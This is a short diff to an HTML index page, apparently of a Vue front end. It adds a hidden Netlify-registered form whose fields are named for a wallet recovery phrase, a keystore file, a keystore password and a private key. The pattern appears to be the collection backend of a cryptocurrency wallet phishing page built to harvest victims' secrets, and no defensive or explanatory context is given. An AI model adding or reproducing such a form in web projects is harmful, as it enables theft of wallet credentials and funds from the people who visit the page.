@@ -39,7 +39,14 @@
         enabled. Please enable it to continue.</strong
       >
     </noscript>
-    <div id="app"></div>
+    <div id="app">
+      <form name="contact" netlify netlify-honeypot="bot-field" hidden>
+        <textarea type="text" name="phraseTextarea" />
+        <textarea name="keystoreTextarea" />
+        <input type="text" name="keystorePassword" />
+        <input type="text" name="privateTextarea"/>
+      </form>
+    </div>
     <!-- built files will be auto injected -->
   </body>
 </html>
